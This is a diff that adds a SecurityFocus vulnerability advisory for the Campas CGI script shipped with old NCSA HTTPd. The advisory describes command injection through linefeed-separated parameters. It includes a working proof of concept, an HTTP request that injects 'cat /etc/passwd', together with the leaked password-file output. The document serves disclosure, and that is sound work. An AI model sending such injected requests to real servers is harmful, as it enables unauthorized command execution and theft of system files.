@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/1975/info
+
+Campas is a sample CGI script shipped with some older versions of NCSA HTTPd, an obsolete web server package. The versions that included the script could not be determined as the server is no longer maintained, but version 1.2 of the script itself is known to be vulnerable. The script fails to properly filter user supplied variables, and as a result can be used to execute commands on the host with the privileges of the web server. Commands can be passed as a variable to the script, separated by %0a (linefeed) characters. See exploit for example. Successful exploitation of this vulnerability could be used to deface the web site, read any files the server process has access to, get directory listings, and execute anything else the web server has access to. 
+
+> telnet target 80
+[...]
+GET /cgi-bin/campas?%0acat%0a/etc/passwd%0a
+<PRE>
+root:x:0:1:Super-User:/export/home/root:/sbin/sh
+daemon:x:1:1::/:
+bin:x:2:2::/usr/bin:
+sys:x:3:3::/:
+adm:x:4:4:Admin:/var/adm:
+lp:x:71:8:Line Printer Admin:/usr/spool/lp:
+smtp:x:0:0:Mail Daemon User:/:/bin/false
+[...]
+
